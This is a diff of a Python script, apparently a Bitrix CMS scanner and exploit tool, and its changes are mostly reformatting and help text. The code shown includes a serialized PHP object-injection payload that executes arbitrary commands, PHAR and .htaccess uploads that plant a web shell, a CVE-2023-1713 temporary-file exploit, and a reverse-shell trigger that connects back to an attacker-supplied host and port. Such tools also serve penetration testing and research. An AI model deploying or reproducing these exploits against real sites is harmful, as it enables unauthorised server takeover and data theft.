@@ -65,8 +65,8 @@ xxxxxxxx0...0x....0xxxxxxxx....xx....xxxxxxxx
 |____/|_|\__|_|  |_/_/\_\ |____/ \___\__,_|_| |_|_| |_|\___|_|
 
 
-The program scans bitrix vulnerability.
-You can also separately check RCE vulnerability (Object injection, Vote and CVE-2023-1713).
+The script scans common bitrix vulnerabilities.
+You can also separately check RCE vulnerabilities (Object injection, Vote and CVE-2023-1713).
 {bcolors.OKGREEN}Green color means potential vulnerability.{bcolors.ENDC}
 {bcolors.WARNING}Yellow color means that request is blocked (403 status code).{bcolors.ENDC}
 {bcolors.FAIL}Red color means nothing valuable is found.{bcolors.ENDC}
@@ -755,11 +755,11 @@ class RCEVoteUpload:
 
         print_ok("Uploading PHAR")
         paths = self.upload_files(
-                             sessid,
-                             [
-                                 self.make_file(self.__payload_name, self.__payload.read())
-                             ]
-                             )
+            sessid,
+            [
+                self.make_file(self.__payload_name, self.__payload.read())
+            ]
+        )
 
         path = paths[self.__payload_name]
 
@@ -805,14 +805,14 @@ class RCEVoteUpload:
         ext = pathlib.Path(self.__payload_name).suffix
 
         paths = self.upload_files(
-                             sessid,
-                             [
-                                 self.make_file(self.__payload_name, self.__payload.read()),
-                                 self.make_file(
-                                     "../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
-                                 ),
-                             ],
-                             )
+            sessid,
+            [
+                self.make_file(self.__payload_name, self.__payload.read()),
+                self.make_file(
+                    "../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
+                ),
+            ],
+        )
         try:
             parts = paths[self.__payload_name].split("/")
             shell_path = "/".join(parts[parts.index("upload"):])
@@ -836,7 +836,8 @@ class ObjectInjection:
         return r'O:27:"Bitrix\Main\ORM\Data\Result":3:{S:12:"\00*\00isSuccess";b:0;S:20:"\00*\00wereErrorsChecked";b:0;S:9:"\00*\00errors";O:27:"Bitrix\Main\Type\Dictionary":1:{S:9:"\00*\00values";a:1:{i:0;O:17:"Bitrix\Main\Error":1:{S:10:"\00*\00message";O:36:"Bitrix\Main\UI\Viewer\ItemAttributes":1:{S:13:"\00*\00attributes";O:29:"Bitrix\Main\DB\ResultIterator":3:{S:38:"\00Bitrix\5CMain\5CDB\5CResultIterator\00counter";i:0;S:42:"\00Bitrix\5CMain\5CDB\5CResultIterator\00currentData";i:0;S:37:"\00Bitrix\5CMain\5CDB\5CResultIterator\00result";O:26:"Bitrix\Main\DB\ArrayResult":2:{S:11:"\00*\00resource";a:1:{i:0;a:2:{i:0;S:' + str(
             len(self.__command)) + r':"' + self.convert_str_for_payload(
             self.__command) + r'";i:1;s:1:"x";}}S:13:"\00*\00converters";a:2:{i:0;S:' + str(
-            len(self.__function)) + r':"' + self.convert_str_for_payload(self.__function) + r'";i:1;s:17:"WriteFinalMessage";}}}}}}}}'
+            len(self.__function)) + r':"' + self.convert_str_for_payload(
+            self.__function) + r'";i:1;s:17:"WriteFinalMessage";}}}}}}}}'
 
     def run(self):
         print_header_rce("RCE via PHP Object Injection ( html_editor_action.php )")
@@ -875,7 +876,8 @@ class ObjectInjection:
 
 class RCETempFileCreate:
 
-    def __init__(self, session, target, path_login, login, password, lport1, lport2, lhost, delay_seconds, n_reps, site_id):
+    def __init__(self, session, target, path_login, login, password, lport1, lport2, lhost, delay_seconds, n_reps,
+                 site_id):
         self.__session = session
         self.__target = target
         self.__sessid = None
@@ -1031,14 +1033,15 @@ class RCETempFileCreate:
         chars = string.digits + string.ascii_lowercase
         with ThreadPoolExecutor(max_workers=10) as executor:
             future_results = executor.map(self.test_exists, itertools.product(chars, repeat=3))
-            for ok, dir_name in tqdm(future_results, total=(len(chars)**3), desc='Searching .htaccess', ncols=100):
+            for ok, dir_name in tqdm(future_results, total=(len(chars) ** 3), desc='Searching .htaccess', ncols=100):
                 if ok:
                     print_ok(f"Found .htaccess: {self.__target}/upload/tmp/{dir_name}/.htaccess")
                     return dir_name
         return None
 
     def reverse_shell(self, dir_name):
-        self.__session.get(f"{self.__target}/upload/tmp/{dir_name}/.htaccess?ip={self.__lhost}&port={self.__lport2}", verify=False)
+        self.__session.get(f"{self.__target}/upload/tmp/{dir_name}/.htaccess?ip={self.__lhost}&port={self.__lport2}",
+                           verify=False)
 
     def run(self):
         self.login()
@@ -1056,24 +1059,8 @@ class RCETempFileCreate:
 
 def main():
     parser = argparse.ArgumentParser(
-        prog='Bitrix scanner',
-        description="""
-    The program scans bitrix vulnerability.
-    Green color means potential vulnerability.
-    Yellow color means that request is blocked (403 status code).
-    Red color means nothing valuable is found.
-
-    There is several modes:
-    1) Scan mode;
-    2) RCE vote;
-    3) RCE vote phar unserialize mode (Exploit Nginx or Apache setup using PHAR deserialization);
-    4) RCE vote using .htaccess (Exploit Apache setup using .htaccess and shell upload);
-    5) RCE "html_editor_action" (Object injection).
-    6) RCE via Insecure Temporary File Creation (It works only with Apache. 
-    The .htaccess file is required to be present in the same directory as the Python3 exploit code).
-    Need any valid set of credentials (regardless of privileges)
-
-    """,
+        prog='python3 test_bitrix.py',
+        description=ascii_banner,
         epilog="""
     Example of usage:
 
@@ -1111,15 +1098,15 @@ def main():
     subparser.required = True
 
     # Scan mode ---------------------------------------------------------------------------
-    parser_scan = subparser.add_parser('scan')
+    parser_scan = subparser.add_parser('scan', help='Scan mode')
     parser_scan.add_argument("-s", '--ssrf_url',
                              help='url for ssrf attack (example: http://5kqki2fsl626q2257vy6xc2ef5lw9rxg.oastify.com)',
                              required=True)
 
     # RCE vote mode -----------------------------------------------------------------------
-    parser_rce_vote = subparser.add_parser('rce_vote')
+    parser_rce_vote = subparser.add_parser('rce_vote', help='RCE vote mode')
     parser_rce_vote.add_argument('--id_agent', default=4, type=int,
-                                 help='ID of vote module agent (2,4 and 7 available)')
+                                 help='ID of vote module agent (2, 4 and 7 available)')
     parser_rce_vote.add_argument('--lhost', help='IP address for reverse connection')
     parser_rce_vote.add_argument('--lport', help='Port of the host that listens for reverse connection')
     parser_rce_vote.add_argument('--web-shell', metavar='webshell', default=False, type=bool,
@@ -1128,30 +1115,39 @@ def main():
                                  help='Path where in the site to upload a random file (example: /upload/iblock/1d3/)')
 
     # RCE vote phar deserialization mode --------------------------------------------------
-    parser_vote_phar = subparser.add_parser('vote_phar')
+    parser_vote_phar = subparser.add_parser('vote_phar', help='RCE vote phar deserialize mode (Exploit Nginx or '
+                                                              'Apache setup using PHAR deserialization)')
     parser_vote_phar.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"),
                                   help='Path to payload file', required=True)
 
     # RCE vote using .htaccess mode -------------------------------------------------------
-    parser_vote_htaccess = subparser.add_parser('vote_htaccess')
+    parser_vote_htaccess = subparser.add_parser('vote_htaccess',
+                                                help='RCE vote using .htaccess mode (Exploit Apache setup using .htaccess and shell upload)')
     parser_vote_htaccess.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"),
                                       help='Path to payload file', required=True)
 
     # RCE object injection mode -----------------------------------------------------------
-    parser_rce_object_injection = subparser.add_parser('object_injection')
+    parser_rce_object_injection = subparser.add_parser('object_injection', help='RCE object injection mode')
     parser_rce_object_injection.add_argument('-f', '--function', default='system', help='Used function')
     parser_rce_object_injection.add_argument('-c', '--command', help='Command for execution', required=True)
 
     # Remote Command Execution (RCE) via Insecure Temporary File Creation (CVE-2023-1713)
     # https://starlabs.sg/advisories/23/23-1713/
-    parser_tmp_file_create = subparser.add_parser('tmp_file_create')
+    parser_tmp_file_create = subparser.add_parser('tmp_file_create', help="""
+    RCE via Insecure Temporary File Creation CVE-2023-1713 (It works only with Apache. 
+    The .htaccess file is required to be present in the same directory as the python script code).
+    Need any valid set of credentials (regardless of privileges)
+    """)
     parser_tmp_file_create.add_argument('-r', '--path_login', default='', help='Url path for login')
     parser_tmp_file_create.add_argument('-l', '--login', default='', help='User login')
     parser_tmp_file_create.add_argument('-p', '--password', default='', help='User password')
     parser_tmp_file_create.add_argument('--lhost', help='IP address for reverse connection', required=True)
-    parser_tmp_file_create.add_argument('--lport1', help='Port of the host that listens for web connection', required=True, type=int)
-    parser_tmp_file_create.add_argument('--lport2', help='Port of the host that listens for reverse connection', required=True, type=int)
-    parser_tmp_file_create.add_argument('-d', '--delay_seconds', help='Delay the deletion of uploaded files', default=60, type=int)
+    parser_tmp_file_create.add_argument('--lport1', help='Port of the host that listens for web connection',
+                                        required=True, type=int)
+    parser_tmp_file_create.add_argument('--lport2', help='Port of the host that listens for reverse shell connection',
+                                        required=True, type=int)
+    parser_tmp_file_create.add_argument('-d', '--delay_seconds', help='Delay the deletion of uploaded files',
+                                        default=60, type=int)
     parser_tmp_file_create.add_argument('-n', '--n_reps', help='Number of replicated files', default=1000, type=int)
     parser_tmp_file_create.add_argument('-i', '--site_id', help='Site id', default='s1')
     args = parser.parse_args()
@@ -1206,7 +1202,9 @@ def main():
             rce_vote_upload = RCEVoteUpload(session, target_url, args.payload, args.payload.name)
             rce_vote_upload.run_htaccess()
         if args.subcommand == 'tmp_file_create':
-            rce_temp_file_create = RCETempFileCreate(session, target_url, args.path_login, args.login, args.password, args.lport1, args.lport2, args.lhost, args.delay_seconds, args.n_reps, args.site_id)
+            rce_temp_file_create = RCETempFileCreate(session, target_url, args.path_login, args.login, args.password,
+                                                     args.lport1, args.lport2, args.lhost, args.delay_seconds,
+                                                     args.n_reps, args.site_id)
             rce_temp_file_create.run()
     except Exception as e:
         print_fail(f'Error: {str(e)}')
